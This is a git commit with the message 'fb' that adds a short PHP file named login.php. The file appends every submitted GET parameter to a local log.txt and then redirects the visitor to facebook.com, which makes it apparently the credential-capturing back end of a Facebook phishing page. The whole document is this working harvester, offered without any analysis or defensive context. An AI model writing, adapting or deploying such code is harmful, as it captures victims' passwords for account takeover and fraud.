d611ce2e8be8c44a443e2879fbc73ed48d000896
nikku124 <38700780+nikku124@users.noreply.github.com>
2018-04-25 06:58:14 +0530

    fb

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: http://www.facebook.com/');
+$handle = fopen("log.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
